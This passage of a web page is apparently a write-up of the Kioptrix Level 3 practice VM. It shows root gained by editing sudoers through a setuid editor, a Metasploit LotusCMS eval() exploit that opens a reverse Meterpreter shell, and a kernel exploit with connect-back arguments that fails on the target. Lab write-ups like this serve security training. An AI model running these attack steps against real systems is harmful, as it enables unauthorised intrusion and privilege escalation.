+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+loneferret@Kioptrix3:~$ ls
+checksec.sh  CompanyPolicy.README
+loneferret@Kioptrix3:~$ cat CompanyPolicy.README
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+
+loneferret@Kioptrix3:~$ whereis ht
+ht: /usr/local/bin/ht
+loneferret@Kioptrix3:~$ ls -la /usr/local/bin/ht
+-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht #### setuid bit is enabled, owned by root
+
+
+Edited /etc/sudoers
+    # User privilege specification
+    root    ALL=(ALL) ALL
+    loneferret ALL=(ALL) ALL
+
+loneferret@Kioptrix3:~$ sudo bash
+[sudo] password for loneferret:
+root@Kioptrix3:~#
+</code></pre>
+<h4 id="lotuscms-30---eval">LotusCMS 3.0 - &lsquo;eval()&rsquo;</h4>
+<pre><code class="language-bash">msf5 &gt; workspace kioptrix
+[*] Workspace: kioptrix
+msf5 &gt; search lotus
+
+Matching Modules
+================
+
+   #   Name                                                     Disclosure Date  Rank       Check  Description
+   -   ----                                                     ---------------  ----       -----  -----------
+   0   auxiliary/dos/http/ibm_lotus_notes                       2017-08-31       normal     No     IBM Notes encodeURI DOS
+   1   auxiliary/dos/http/ibm_lotus_notes2                      2017-08-31       normal     No     IBM Notes Denial Of Service
+   2   auxiliary/dos/misc/ibm_sametime_webplayer_dos            2013-11-07       normal     No     IBM Lotus Sametime WebPlayer DoS
+   3   auxiliary/gather/ibm_sametime_enumerate_users            2013-12-27       normal     No     IBM Lotus Notes Sametime User Enumeration
+   4   auxiliary/gather/ibm_sametime_room_brute                 2013-12-27       normal     No     IBM Lotus Notes Sametime Room Name Bruteforce
+   5   auxiliary/gather/ibm_sametime_version                    2013-12-27       normal     No     IBM Lotus Sametime Version Enumeration
+   6   auxiliary/scanner/lotus/lotus_domino_hashes                               normal     No     Lotus Domino Password Hash Collector
+   7   auxiliary/scanner/lotus/lotus_domino_login                                normal     No     Lotus Domino Brute Force Utility
+   8   auxiliary/scanner/lotus/lotus_domino_version                              normal     No     Lotus Domino Version
+   9   exploit/multi/http/lcms_php_exec                         2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
+   10  exploit/windows/browser/ibmlotusdomino_dwa_uploadmodule  2007-12-20       normal     No     IBM Lotus Domino Web Access Upload Module Buffer Overflow
+   11  exploit/windows/browser/inotes_dwa85w_bof                2012-06-01       normal     No     IBM Lotus iNotes dwa85W ActiveX Buffer Overflow
+   12  exploit/windows/browser/notes_handler_cmdinject          2012-06-18       excellent  No     IBM Lotus Notes Client URL Handler Command Injection
+   13  exploit/windows/browser/quickr_qp2_bof                   2012-05-23       normal     No     IBM Lotus QuickR qp2 ActiveX Buffer Overflow
+   14  exploit/windows/fileformat/lotusnotes_lzh                2011-05-24       good       No     Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)
+   15  exploit/windows/lotus/domino_http_accept_language        2008-05-20       average    No     IBM Lotus Domino Web Server Accept-Language Stack Buffer Overflow
+   16  exploit/windows/lotus/domino_icalendar_organizer         2010-09-14       normal     Yes    IBM Lotus Domino iCalendar MAILTO Buffer Overflow
+   17  exploit/windows/lotus/domino_sametime_stmux              2008-05-21       average    Yes    IBM Lotus Domino Sametime STMux.exe Stack Buffer Overflow
+   18  exploit/windows/lotus/lotusnotes_lzh                     2011-05-24       normal     No     Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)
+
+
+msf5 &gt; use 9
+msf5 exploit(multi/http/lcms_php_exec) &gt; show options
+
+Module options (exploit/multi/http/lcms_php_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /lcms/           yes       URI
+   VHOST                     no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+
+msf5 exploit(multi/http/lcms_php_exec) &gt; set RHOSTS 192.168.88.131
+RHOSTS =&gt; 192.168.88.131
+msf5 exploit(multi/http/lcms_php_exec) &gt; set VHOST kioptrix3.com
+VHOST =&gt; kioptrix3.com
+msf5 exploit(multi/http/lcms_php_exec) &gt; set URI /
+URI =&gt; /
+msf5 exploit(multi/http/lcms_php_exec) &gt; show options
+
+Module options (exploit/multi/http/lcms_php_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.88.131   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /                yes       URI
+   VHOST    kioptrix3.com    no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+
+msf5 exploit(multi/http/lcms_php_exec) &gt; run
+
+[*] Started reverse TCP handler on 192.168.88.128:4444
+[*] Using found page param: /index.php?page=index
+[*] Sending exploit ...
+[*] Sending stage (38288 bytes) to 192.168.88.131
+[*] Meterpreter session 1 opened (192.168.88.128:4444 -&gt; 192.168.88.131:57972) at 2020-01-04 15:22:46 +0100
+meterpreter &gt; sysinfo
+Computer    : Kioptrix3
+OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+Meterpreter : php/linux
+meterpreter &gt; getuid
+Server username: www-data (33)
+meterpreter &gt; shell
+Process 4390 created.
+Channel 7 created.
+lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 8.04.3 LTS
+Release:        8.04
+Codename:       hardy
+
+</code></pre>
+<h6 id="priv-esc">Priv Esc</h6>
+<pre><code class="language-bash">root@kali:~/kioptrix/level3# searchsploit -m exploits/linux/remote/8556.c
+  Exploit: Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1) - SCTP FWD Memory Corruption Remote Overflow
+      URL: https://www.exploit-db.com/exploits/8556
+     Path: /usr/share/exploitdb/exploits/linux/remote/8556.c
+File Type: C source, ASCII text, with CRLF line terminators
+
+Copied to: /root/kioptrix/level3/8556.c
+
+
+root@kali:~/kioptrix/level3# gcc 8556.c -o 8556
+8556.c:32:10: fatal error: netinet/sctp.h: No such file or directory
+   32 | #include &lt;netinet/sctp.h&gt;
+      |          ^~~~~~~~~~~~~~~~
+compilation terminated.
+root@kali:~/kioptrix/level3# apt install libsctp-dev
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  libayatana-ido3-0.4-0 libbfio1 libdvdread4 libhogweed4 libhwloc5 libisl21 libjim0.77 libjte1 libnettle6 libobjc-9-dev python-magic python-paramiko python-pefile python-qrcode
+Use 'apt autoremove' to remove them.
+The following additional packages will be installed:
+  libsctp1
+Suggested packages:
+  lksctp-tools
+The following NEW packages will be installed:
+Get:1 http://ftp1.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libsctp1 amd64 1.0.18+dfsg-1 [28.3 kB]
+Get:2 http://ftp2.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libsctp-dev amd64 1.0.18+dfsg-1 [81.5 kB]
+Fetched 110 kB in 1s (153 kB/s)
+Selecting previously unselected package libsctp1:amd64.
+(Reading database ... 311290 files and directories currently installed.)....................................................................................................................................................................................................................................................................................................................................]
+Preparing to unpack .../libsctp1_1.0.18+dfsg-1_amd64.deb ...
+Unpacking libsctp1:amd64 (1.0.18+dfsg-1) ...
+Selecting previously unselected package libsctp-dev:amd64.
+Preparing to unpack .../libsctp-dev_1.0.18+dfsg-1_amd64.deb ...
+Unpacking libsctp-dev:amd64 (1.0.18+dfsg-1) ...
+Setting up libsctp1:amd64 (1.0.18+dfsg-1) ...
+Setting up libsctp-dev:amd64 (1.0.18+dfsg-1) ...
+Processing triggers for man-db (2.9.0-2) ...
+Processing triggers for libc-bin (2.29-3) ...
+root@kali:~/kioptrix/level3# gcc 8556.c -o 8556
+root@kali:~/kioptrix/level3# chmod +x 8556
+root@kali:~/kioptrix/level3# ./8556
+./sctp_houdini
+        -H lhost   (local host address for connect back shel)
+        -P lport   (local port address for connect back shell)
+        -h rhost   (remote target host)
+        -p rport   (remote target port)
+        -t kernel  (target kernel)
+        -s sport   (source port defining sctp association where corruption occurs)
+                   (always use higher port if you run the exploit multiple times eg. 20000, 21000, etc..)
+                   (NEVER reuse the same or next port or vsys will be trashed and init will die soon...)
+        -c conn    (number of connectionis before corruption - default 600)
+
+./8556 -H 192.168.88.128 -P 4444 -h 192.168.88.131 -p 80 -t a -s 20000
+Unable to find target: a
+Available targets are:
+- ubuntu64_faisty-2.6.20-[15-17]-generic  (faisty: generic kernel)
+- ubuntu64_faisty-2.6.20-17-server  (faisty: server kernel - last 2.6.20-17 build)
+- ubuntu64_hardy-2.6.24-[18-21]-generic  (kernel from 2.6.24-18 to kernel 2.6.24-21 -- generic)
+- ubuntu64_hardy_2.6.24-[16-18]-server  (kernel from 2.6.24-16 to 2.6.24-18 -- server)
+- ubuntu64_hardy-2.6.24-[19-22]-server  (kernel from 2.6.24-19 to 2.6.24-22 -- server)
+- ubuntu64_hardy-2.6.24-23-last-server  (last 2.6.24-23 kernel before patch -- server)
+- ubuntu64_intrepid-2.6.27-7-server  (kernel 2.6.27-7 -- server)
+- ubuntu64_intrepid-2.6.27-[9-last]-server  (kernel 2.6.27-9 to the last unpatched kernel -- server)
+- ubuntu64_intrepid-2.6.27-[7-last]-generic  (kernel 2.6.27-9 to the last unpatched kernel -- server)
+- fedora64_10-2.6.25-117  (fedora core 10 default installed kernel)
+- opensuse64_11.1-2.6.27.7-9-default  (opensuse 11.1 default installed kernel)
+</code></pre>
+<p>Doenst work on our kernel, latest supported is ubuntu64_hardy-2.6.24-23-last-server</p>
+
+
+<footer class="footline">
+	
+</footer>
+
+        
+        </div> 
+        
+
+      </div>
+
+    <div id="navigation">
+        
+        
+        
+        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+        
+                    
+                        
+            
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                        
+                        
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                        
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+                    
+            
+        
+        
+        
+
+
+	 
+	 
+    </div>
+
+    </section>
+    
+    <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
+      <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
+    </div>
+    <script src="/js/clipboard.min.js"></script>
+    <script src="/js/perfect-scrollbar.min.js"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js"></script>
+    <script src="/js/jquery.sticky.js"></script>
+    <script src="/js/featherlight.min.js"></script>
+    <script src="/js/highlight.pack.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script src="/js/modernizr.custom-3.6.0.js"></script>
